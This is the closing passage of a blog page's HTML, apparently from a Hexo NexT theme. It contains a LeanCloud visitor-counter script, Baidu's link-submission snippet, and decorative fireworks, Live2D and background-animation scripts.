        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  
  

  

  

  
  <script type="text/javascript" src="/js/src/exturl.js?v=5.1.4"></script>


  
  
 <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
 <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
 <script type="text/javascript" src="/js/src/fireworks.js"></script>


<div class="bg_content">
<canvas id="canvas"></canvas>
</div>
<!-- 雪花特效 -->
<!--<script type="text/javascript">

    document.write('<script type="text/javascript" src="/js/src/snow2.js"><\/script>');

</script>-->

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":100,"height":200},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
<script type="text/javascript" src="/js/src/dynamic_bg.js"></script>